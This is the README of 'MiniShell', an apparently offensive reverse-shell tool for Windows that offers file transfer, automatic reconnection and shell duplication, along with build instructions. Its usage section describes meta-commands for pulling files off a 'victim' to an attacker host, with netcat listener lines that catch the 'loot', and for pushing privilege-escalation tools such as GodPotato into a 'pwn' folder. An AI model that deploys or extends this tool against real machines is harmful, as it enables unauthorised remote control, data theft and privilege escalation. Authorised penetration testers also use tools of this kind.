# MiniShell
A reverse shell for Windows systems that brings some convenience features.
Among them are:
+ file transfer
+ automatic reconnection attempt on connection loss
+ easy duplication of established shells
+ easy choice/switch between `cmd` and `powershell` command interpreter
+ features can be chosen at build time (can be stripped down to a minimal shell without extra features)

# Usage
`MiniShell` provides so-called meta-commands. These start with a colon (":"). Currently the supported meta-commands are:
+ `:exit` - kill the shell (it doesn't come back)
+ `:dup [[<host>] <port>]` - send a duplicate of the current shell (default to the same endpoint it is already connected to)
+ `:c ps` - connect to a new `powershell` command interpreter (useful if current command hangs)
+ `:c cmd` - same as above but with `cmd`
+ `:get [[<host>] <port>] <reomote-file>` - read the contents of `<remote-file>` and send it to `host:port` (by default the same endpoint already connected to)
  + e.g. catch file on attack host like this: `nc -l 80 > myLoot.txt`
+ `:put [[<host>] <port>] <remote-file>`
  + e.g. send file like this: `cat GodPotato-NET4.exe | nc -q 1 -lp 80`
  + then retrieve file on victim like this `:put C:\windows\temp\pwn\GodPotato.exe` (assuming your shell is connected to port `80`, otherwise specify port)

# Build
+ using Visual Studio 2022

## .NET executable
+ preferably set target framework at `net46` since this should work for most Windows 10 and newer system out of the box

### Build release version (recommended)
+ smaller than debug
+ debug output disabled (doesn't matter much for regular use)
```
MSBuild.exe .\MiniShell.sln /p:Configuration=Release
```
### Build debug version
```
MSBuild.exe .\MiniShell.sln /p:Configuration=Debug
```

## Native executable
+ should work on Windows systems without .NET runtime (pre Windows 10), but binaries are much larger than .NET binaries
+ uses the ahead-of-time compilation feature of .NET 7+ (https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/?tabs=net7%2Cwindows)
+ set target framework to `net8` (in `MiniShell.csproj`) before building


### Build release version (recommended)
+ recommended since it saves about half in size
```
dotnet publish -r win-x64 -c Release -f net8 -p:PublishAot=true --self-contained
```

### Build debug version
```
dotnet publish -r win-x64 -c Debug -f net8 -p:PublishAot=true --self-contained
```
